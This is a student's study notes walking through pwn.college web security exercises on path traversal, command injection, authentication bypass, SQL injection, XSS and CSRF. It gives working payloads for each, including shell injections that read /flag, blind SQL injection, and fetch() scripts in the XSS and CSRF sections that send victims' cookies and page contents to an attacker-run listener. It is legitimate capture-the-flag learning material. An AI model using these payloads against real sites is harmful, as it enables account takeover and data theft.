Lots of different apps are on the Web, including banking for example.

It would be disastrous if you could just send an HTTP from "red" (hacker) to "green" (bank) making a request to transfer 1 million dollars from "blue" (person, etc.) to red.

Or if "red" somehow convinced "blue" to visit a URL (or click an image with bad src), that URL could do that same HTTP "transfer" request.

Obviously this is very primitive and doesn't (SHOULDN'T) happen in any real world app worth its water, but these are things we need to pay attention to.

[[Web Client Security Considerations]]
[[Web Server Security Considerations]]

[[Injection]]s
[[Path traversal]]
[[Authentication Bypass]]

[[Cross-Site Scripting]]
[[Cross-Site Request Forgery]]

Related: [[URL Encoding]], [[Shelling out]], [[HTTP Cookies]], [[netcat|nc]], [[Structured Query Language|SQL]], [[JavaScript]]

# pwn.college Exercises
#### Path traversal 1
Server gives contents of local file whose path is specified in URL param
Inject "../../flag" on /content/ so that the server reads that as path and gets us flag instead of index.html
Problem: ../ -> goes backward in path of the URL, not the command. So we do [[URL Encoding]]: . = %2E, / = %2F
%2e%2e%2f%2e%2e%2fflag
#### Path traversal 2
Now the developer has made it so that it strips "./"s (removes the leading or trailing)
#### Command Injection 1
The server allows us to write an input, and executes a cmd for us.
ls -l (input) -> input set to "; cat /flag" -> gets flag
#### Command Injection 2
Now the developer has made it so that we can't insert ; we can still pipe
ls -l (input) -> input set to "| cat /flag" -> gets flag
#### Command Injection 3
Now the developer has made it so that the input is in '' quotes. This way special characters are part of the input.
ls -l '(input)' -> We can end the left hand quote so that ls -l is performed on arg '' and pipe cat and then /flag inside another quote. -> input = ' | cat /flag' -> ls -l '' | cat '/flag'
#### Command Injection 4
"[[Shelling out]]" is dangerous
Any part of a shell command is potentially injectible.
TZ=input date
input = "";  cat /flag; 
So shell executes TZ="" ; cat /flag ; date
#### Command Injection 5
Now we get no output back.
Server runs touch (input)
If we set input to asd ; cat /flag > asd
We can open a terminal and cat asd. That's the solution I thought of
#### Command Injection 6
They've blocked most special chars. Supposedly nearly perfect solution for blocking cmd injection but there is a very familiar solution
Send newline \n. But through browser %0a
#### Authentication Bypass 1
In this case there is an SQL database with username password table. HTTP login form, on send it checks if you are "logged in" as admin. If session_user param is admin then you get the flag. You don't even have to send the HTTP form through POST, you can directly set the param session_user=admin in the URL query.
#### Authentication Bypass 2
Similar to previous one but this time the check is done through [[HTTP Cookies]] instead of on the URL query. Similar thing, can send an HTTP request with the header Cookie: session_user=admin. Done through curl --header, or whatever else, even [[netcat|nc]]
#### SQL Injection 1
Similar to auth bypass, you have an admin user with some pin, guest user with pin 1337.
The SQL query is written as "WHERE username = '{username}' AND pin = { pin } "
username and pin are user inputs. My guess is that when pin gets placed in that string, whatever we insert as pin gets queried. The only check they have is if pin\[0] is a numeric char. So if we input 0 OR 1=1, we should be able to login
#### SQL Injection 2
This time the injection happens partway through the query, not at the end like in the previous one. The query must remain valid despite the injection.
Query is "WHERE u = '{u}' and password = ' { password } '"
If we enter close single quote OR '1'='1 in between that we will get password = '' OR '1'='1'
#### SQL Injection 3
This time we need to chain SQL queries to leak data.
The webpage gives us a user query service.
SELECT username FROM users WHERE username LIKE "%" we can [[UNION query]] another SELECT.
SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username LIKE "admin"
#### SQL Injection 4
Same type of app as SQLi3 (previous exercise)
Now we do not know the database structure (name of the users table). It has been randomised (or encrypted). This is not the "gotcha" solution devs think it is, as [[SQL Engine]]s have metadata stored on the [[Schema table]]. In this case SQLite's sqlite_master. We can grab tbl_name and then run the same query as SQLi3
#### SQL Injection 5
Sometimes the query result isn't sent back to you. What can we do now?
User, Password input
Check is: query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
If the user and password is correct, we get redirected to a page saying "Hello {username}". If it's wrong we get redirected to invalid input.
So the idea here is to ask yes/no questions through queries, and if the answer is yes, we get redirected to the Hello page, if no we get redirected to invalid input.
If we inject password as ' OR substr(password, 1, 1)='p, that will check if the first char is p. Do that for the rest and eventually we get the password.
Essentially a [[brute force]]. Can write a bash script to send all these requests, as we are checking 64 characters (flag is base64) per position, 53 positions.
#### XSS 1
We explored XSS in the form of stored XSS. The server allows us to create posts on a forum. On the victim side (another python script) it checks what shows up. For our first XSS we inject an input textbox (instead of a "post"). We inject HTML here. \<input type="text"/>
#### XSS 2
This time we have Stored XSS but we will execute some [[JavaScript]] on the victim's browser. We will execute alert("PWNED"). Same way as previous. We inject \<script>alert("PWNED")\</script>
#### XSS 3
This time we do a Reflected XSS. We need to inject the same script from XSS 2, but this time we don't have a way to write it in a database so that it appears on the other user stumbling on it. Instead we can craft it into the URL param that a victim will visit. This server displays whatever the msg param we write, onto the screen. If msg is the script.. It will execute it.
http://challenge.localhost/?msg=%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
We need to do URL encoding to write the script tag.
#### XSS 4
In the same way that we might have to inject SQL in mid quotes (not at ending of query), sometimes in XSS injections we do it in textareas, not directly where we want to. Such is this case, we need to get out of the textarea context somehow.
Solution: Close the textarea \</textarea> then insert the same script as before.
http://challenge.localhost/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3B%3C%2Fscript%3E
#### XSS 5
Actual XSS injections try to do something more than a simple alert("pwned"). One goal is to send HTTP requests from the victim's browser, masquerading as them.
This time the flag is in the admin's unpublished draft post. XSS-inject the admin and use that to make an HTTP request as the admin user in order to read the flag. We will use the fetch() as suggested by pwn.college.
users and posts table. Users has username and password. Posts has author, content and published (true/false).
If draft, it shows only 12 characters of the post. If full, shows full. Shows it to all users.
So my guess is we need to somehow write a script that upon admin login (through /challenge/victim -> script that "acts" as our victim logging in), will execute a script (inject it as a post that will be shown to them? Scripted XSS) that will make a fetch request to publish admin's draft.
The endpoints are /login, /draft, /publish and /.
Make a fetch GET request as the admin on /publish and publish the posts. This endpoint makes all drafts published.
So we login as hacker, make a post that contains instead of normal post text a script that does fetch("http://challenge.localhost/publish")
#### XSS 6
Similar to previous one but with POST request instead since /publish is now a POST endpoint.
fetch("http://challenge.localhost/publish", {method: 'POST', body: JSON.stringify(username: 'admin')});
#### XSS 7
Another reason for XSS is to exfiltrate user authentication data and take over a victim's account. This data is often stored in cookies (similar to Auth Bypass 2) but much more secure.
Auth data for the logged in user is stored in a cookie. Use XSS to leak admin's cookie. 
Happens via HTTP to a server that you will run -> nc listening on a port is sufficient.
This time the admin user can't make posts.
Cookie has auth. So I assume we need to make the XSS script be a script that upon admin login (via the /challenge/victim script running) it will make the admin load the hacker post. The hacker post will in turn make a fetch POST request to our server providing the cookie that is set on the victim's browser.
Solution: The actual solution has nothing to do with the cookies directly, since the cookie only has the last 20 characters of the flag. Instead, we need to send the entire HTML page of / when the admin is logged in, since it shows the entire draft posts of a user.
```JavaScript
<script>
fetch("http://challenge.localhost/")
	.then(r => r.text())
	.then(text => 
		fetch("http://localhost:8000/", { method: 'POST', body: JSON.stringify({ht: text})})
		);\</script>
```
We have got the entire HTML
#### Cross-Site Request Forgery 1
XSS issues for admin are fixed. Now we need CSRF to publish the flag post. victim script logs into the forum and then visits an evil site that we can set up. It will point to our local workspace. So a server needs to run there on hacker.localhost:1337.
Different origins, so [[Same-Origin Policy]] applies. We need to be careful how we approach this.
My guess is that when admin visits our url, we can make the admin publish his flag draft post.
The publish endpoint now is a GET response and it only checks if username is in session. So when admin visits our page we just need to make him send a request to /publish with username=admin? The issue is the Same Origin Policy.
HTTP/1.1 302 Found
Location: http://challenge.localhost/publish?username=admin
Content-Type: text/html
Content-Length: 0
Connection: close
Solution: I ended up making a python3 -m http.server on a csrf directory. Inside that directory I had index.html with a script that simply does a full redirection window.location = "http://challenge.localhost:80/publish"
#### CSRF 2
This time the publish endpoint is a POST.
We want to send a POST. We can't rly do a JS-induced one. So we can create a 3rd party HTTP form and send that. On the form we specify method POST and action (URL to the endpoint), add one input with value admin on name username
We load a JS script to submit since the victim doesn't submit.
#### CSRF 3
This time we use CSRF to trigger an XSS and invoke alert("pwned") somewhere on the main website. The victim will visit our site after logging in to the main website.
There's an /ephemeral GET request that has some request params called msg. So we can make the victim's browser send a GET request to that /ephemeral with some param ?msg to equal script alert("PWNED"); so instead of a regular message we inject that HTML script tag. Upon alert, the victim script will give us the flag. window.location is pretty straightforward, just URL encode the script tags.
#### CSRF 4
CSRF to XSS leading to a cookie leak that will allow us to login and get the flag.
/ephemeral is same.
If we send the victim to ephemeral and send back some garbage GET method with document.cookie as param
```JS
<script>
window.location = "http://challenge.localhost/ephemeral?msg=<script>fetch(`http://hacker.localhost:1337/cookie=${document.cookie}`)<%2fscript>"
</script>
```
Since our python http.server will log requests, we will get the cookie. We can use that to login to the main server as admin and get the flag that is in the draft post.
#### CSRF 5
In this one, they fixed any cookies being stolen by setting the [[HttpOnly]] flag.
The victim logs in to the main site, then visits our site.
We can redirect them back to the main site /ephemeral, send a msg param that is a script that will fetch the main site root / (has the full draft post shown, so the entire flag), get the text and send the text back on some garbage GET method to our junk server.
```JS
window.location = "http://challenge.localhost/ephemeral?msg=<script>fetch('http://challenge.localhost/').then(r => r.text()).then(text => fetch(`http://hacker.localhost:1337/t=${text}`));<%2fscript>";
```
